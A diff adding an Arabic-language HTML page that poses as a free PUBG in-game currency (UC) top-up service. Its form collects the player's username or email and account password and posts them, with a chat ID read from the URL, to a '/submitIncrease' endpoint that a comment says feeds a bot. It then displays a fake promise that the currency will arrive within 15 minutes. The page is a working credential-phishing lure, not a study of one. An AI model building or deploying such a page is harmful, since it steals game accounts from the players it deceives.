@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <title>شحن شدات ببجي</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .container {
+            background-color: #1c1c1c;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            color: #FFD700;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"], select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #333;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #FFD700;
+            color: black;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .pubg-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+        .notification {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #FFD700;
+            color: black;
+            padding: 10px 20px;
+            border-radius: 5px;
+            z-index: 100;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            display: none;
+        }
+        .notification.show {
+            opacity: 1;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/PUBG_logo.svg" alt="PUBG Logo" class="pubg-logo">
+        <h1>شحن شدات ببجي 🎮🚀</h1>
+        <form id="increaseForm">
+            <input type="hidden" name="chatId" id="chatIdInput">
+            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <select name="uc" required>
+                <option value="">اختر عدد الشدات</option>
+                <option value="60">شدات 60🔥</option>
+                <option value="300">شدات 300⭐</option>
+                <option value="600">شدات 600💥</option>
+                <option value="1500">شدات 1500🚀</option>
+            </select>
+            <button type="submit">شحن</button>
+        </form>
+        <div class="notification" id="notification">
+            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف تصل الشدات في غضون 15 دقيقة.</p>
+        </div>
+    </div>
+    <script>
+        const increaseForm = document.getElementById('increaseForm');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const notification = document.getElementById('notification');
+
+        // استخراج معرف المحادثة من عنوان URL
+        const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
+
+        increaseForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+            const formData = new FormData(increaseForm);
+            const data = Object.fromEntries(formData.entries());
+
+            // إرسال البيانات إلى البوت
+            fetch('/submitIncrease', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // عرض الإشعار
+                    notification.classList.add('show');
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000); // إخفاء الإشعار بعد 5 ثوان
+                    // إعادة عرض لوحة التسجيل
+                    increaseForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            });
+        });
+    </script>
+</body>
+</html>
